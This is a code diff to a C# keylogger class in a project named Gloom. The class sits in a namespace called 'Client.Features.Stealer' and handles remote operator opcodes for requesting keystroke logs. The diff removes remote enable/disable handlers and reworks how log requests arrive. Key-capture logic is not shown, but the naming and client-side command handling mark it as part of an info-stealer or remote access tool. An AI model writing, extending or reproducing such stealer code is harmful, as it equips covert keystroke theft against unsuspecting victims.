@@ -1,11 +1,9 @@
-﻿using static Gloom.KeyLoggerData;
-
-namespace Gloom.Features.Stealer;
-internal class KeyLogger : BaseFeature
+﻿namespace Gloom.Client.Features.Stealer;
+internal class KeyLogger : FeatureBase
 {
 	private bool active = true;
 
-	public override Guid[] AcceptedOps => new Guid[] { OpCodes.KeyLogRequest };
+	public override Guid[] AcceptedOps => new Guid[] { OpCodes.KeyLoggerSettingRequest, OpCodes.KeyLogRequest };
 
 	public KeyLogger(IMessageSender sender) : base(sender)
 	{
@@ -15,20 +13,9 @@ internal class KeyLogger : BaseFeature
 	{
 		if (op != OpCodes.KeyLogRequest)
 			return;
-		KeyLoggerRequest req = StructConvert.Byte2Struct<KeyLoggerRequest>(data);
+		OpStructs.KeyLogRequest req = StructConvert.Bytes2Struct<OpStructs.KeyLogRequest>(data);
 #if DEBUG
-		Console.WriteLine("KeyLogger request receive: " + req.RequestType);
+		Console.WriteLine("KeyLogger log receive. count=" + req.LogCount);
 #endif
-		if (req.RequestType == EnableKeyLogger)
-		{
-			active = true;
-			await SendAsync(OpCodes.KeyLogResponse, new KeyLoggerStateResponse { Enabled = active }, true);
-		}
-
-		if (req.RequestType == DisableKeyLogger)
-		{
-			active = false;
-			await SendAsync(OpCodes.KeyLogResponse, new KeyLoggerStateResponse { Enabled = active }, true);
-		}
 	}
 }
